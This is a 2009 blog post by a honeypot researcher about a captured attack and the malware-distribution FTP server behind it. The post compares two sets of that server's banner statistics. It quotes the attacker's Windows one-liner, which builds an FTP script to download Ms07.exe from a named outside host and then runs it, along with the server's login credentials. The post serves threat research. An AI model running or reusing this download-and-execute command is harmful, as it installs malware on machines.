---
title: "Iteolih: If you can't touch it ..."
authors: ["Markus Koetter"]
date: "2009-07-21"
tags: 
  - "ftp"
  - "iteolih"
---
{{<figure src="images/banner.png" alt="Banner" width="50%">}}

While playing with the current hsoc code, I got attacked, and saw an offer to download something from somewhere.  
`  
cmd /c echo open v1.usbupdatestrings.at 4356 > i&echo user ik ik >> i &echo binary >> i &echo get Ms07.exe >> i &echo quit >> i &ftp -n -s:i &Ms07.exe  
`  
The offer to download something was not that unexpected, we are working hard to get these offers, so we can grab copies of something, but the location was interesting. Obviously they decided to go for a central service to deploy their malware, and to indicate that level of professionalism on first sight, they use(d) a domain.  
  
To honor their effort, I decided to give them a visit ...  
  
`  
lftp ftp://ik:ik@v1.usbupdatestrings.at:4356  
`  
To allow having a look on the whole traffic, I decided to run lftp in debug mode  
`  
lftp ik@v1.usbupdatestrings.at:~> debug  
`  
And connect the service  
`  
lftp ik@v1.usbupdatestrings.at:~> ls  
---- Connecting to v1.usbupdatestrings.at (79.99.6.123) port 4356  
<--- 220-Serv-U FTP Server v5.0 for WinSock ready...  
<--- 220-.:::::::::::::::::::::::::::::::::::::::::::::::::.  
<--- 220-.::::|  
<--- 220-.::::| o0o-====== pe[ro =======-o0o  
<--- 220-.::::|________________________________________  
<--- 220-.:::::::::::::::::::::::::::::::::::::::::::::::::.  
<--- 220-.::::|  
<--- 220-.::::| o0o-========= USER STATS =========-o0o  
<--- 220-.::::|  
<--- 220-.::::| You are Connecting From 'The great Tor Network'  
<--- 220-.::::| 231352 users have visited in the last 24 hours  
<--- 220-.::::| This server has been running for  
<--- 220-.::::|14 Days, 1 Hours, 0 Mins, 43 Secs  
<--- 220-.::::|  
<--- 220-.::::|Amout of Logins Since Server Started: 1020885 total  
<--- 220-.::::| o0o-======== SERVER STATS ========-o0o  
<--- 220-.::::|  
<--- 220-.::::| Logged in Users: 52  
<--- 220-.::::| Total Kb downloaded: 60855849 Kb  
<--- 220-.::::| Total Kb uploaded: 1132 Kb  
<--- 220-.::::| Amout of Files downloaded: 731839  
<--- 220-.::::| Amout of Files uploaded: 11  
<--- 220-.::::| Average Speed: 50.161 Kb/sec  
<--- 220-.::::| Current Speed: 323.925 Kb/sec  
<--- 220-.::::| Free Disk Space: 92367.79 MB  
<--- 220-.::::|________________________________________  
<--- 220 .:::::::::::::::::::::::::::::::::::::::::::::  
`  
  
_If you can't touch it, you have to count it_, I appreciate the decision to share these numbers with everybody connecting.  
  
Today, I wanted to give them a new shot, fresh numbers, so I could compare the numbers to see if they seem reliable.  
For some reason the domain v1.usbupdatestrings.at is gone already, but the service was still running on the same ip.  
  
`  
<--- 220-.::::| o0o-========= USER STATS =========-o0o  
<--- 220-.::::|  
<--- 220-.::::| You are Connecting From 'The great Tor Network'  
<--- 220-.::::| 169188 users have visited in the last 24 hours  
<--- 220-.::::| This server has been running for  
<--- 220-.::::|14 Days, 21 Hours, 32 Mins, 28 Secs  
<--- 220-.::::|  
<--- 220-.::::|Amout of Logins Since Server Started: 1144533 total  
<--- 220-.::::| o0o-======== SERVER STATS ========-o0o  
<--- 220-.::::|  
<--- 220-.::::| Logged in Users: 7  
<--- 220-.::::| Total Kb downloaded: 66602829 Kb  
<--- 220-.::::| Total Kb uploaded: 1524 Kb  
<--- 220-.::::| Amout of Files downloaded: 804645  
<--- 220-.::::| Amout of Files uploaded: 16  
<--- 220-.::::| Average Speed: 51.746 Kb/sec  
<--- 220-.::::| Current Speed: 45.348 Kb/sec  
<--- 220-.::::| Free Disk Space: 92367.55 MB  
<--- 220-.::::|________________________________________  
<--- 220 .:::::::::::::::::::::::::::::::::::::::::::::  
`  
  
So, within 20hours, their ftp service had:  

  
- Amout of Logins (1144533 - 1020885) = **123648**
  
- Amout of Files downloaded (804645 - 731839) = **72806**
  
- Amout of Files uploaded (16 - 11) = 5
  
- Total Kb downloaded (66602829 - 60855849) = **5746980** (5612 Mbyte)
  

  
  
Getting copies of the malware from the service and submit them to virustotal, to verify if the five malware updates during the last 20 hours were worth the effort, is left as an exercise for the reader.
